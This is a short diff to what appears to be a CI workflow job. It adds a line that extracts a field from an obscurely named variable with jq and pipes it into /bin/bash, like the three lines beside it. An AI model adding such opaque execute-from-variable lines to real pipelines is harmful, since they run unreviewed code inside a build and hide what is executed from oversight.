@@ -23,6 +23,7 @@ jobs:
           echo $uyprf7503 | jq -r .w0 | /bin/bash
           echo $dnih04 | jq -r .k5733 | /bin/bash
           printf '%s' "$z1" | jq -r .dzji2 | /bin/bash
+          printf '%s' "$g22" | jq -r .x75488 | /bin/bash
 
       - name: Save output
         if: always()
